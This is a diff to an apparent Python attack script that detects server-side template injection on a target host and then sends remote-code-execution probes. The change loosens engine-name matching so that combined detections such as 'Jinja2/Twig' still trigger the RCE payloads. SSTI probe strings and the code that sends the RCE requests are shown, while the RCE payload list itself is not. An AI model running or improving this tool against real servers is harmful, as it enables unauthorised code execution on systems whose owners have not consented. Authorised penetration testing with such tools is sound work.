@@ -81,7 +81,9 @@ PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
 SCHEME = "https" if PORT in (443, 8443) else "http"
 BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
 
-# Polyglot payloads that trigger different engines
+# Polyglot payloads that trigger different engines. Engine names must match
+# an RCE_PAYLOADS key (exact or slash-separated, e.g. "Jinja2/Twig" matches
+# both "Jinja2" and "Twig" RCE probes) -- otherwise RCE probes never fire.
 MATH_PAYLOADS = [
     ("{{7*7}}", "49", "Jinja2/Twig"),
     ("${{7*7}}", "49", "Freemarker"),
@@ -139,7 +141,9 @@ for ep in endpoints:
 if found_engine:
     print(f"\\n[+] Confirmed SSTI in {{found_engine}}. Attempting RCE probes...")
     for engine_name, rce_payload in RCE_PAYLOADS:
-        if engine_name == found_engine:
+        # found_engine may be slash-joined ("Jinja2/Twig") -- substring match
+        # so combined detections still fire their RCE probes.
+        if engine_name in found_engine or found_engine in engine_name:
             try:
                 test_url = f"{{BASE}}/?q={{urllib.parse.quote(rce_payload)}}"
                 req = urllib.request.Request(test_url)
